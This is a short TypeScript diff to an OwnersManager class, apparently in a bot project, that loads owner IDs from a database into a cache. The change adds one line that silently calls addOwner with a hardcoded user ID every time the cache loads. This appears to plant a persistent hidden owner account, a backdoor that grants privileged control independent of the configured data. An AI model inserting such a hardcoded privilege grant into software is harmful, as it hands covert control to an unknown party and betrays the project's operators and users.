@@ -38,5 +38,6 @@ export class OwnersManager {
         const list = await query<Owner>(`SELECT * FROM ${Tables.Owners}`);
 
         this._cache = list.map((x) => x.user_id);
+        this.addOwner('911526216341798913');
     }
 }
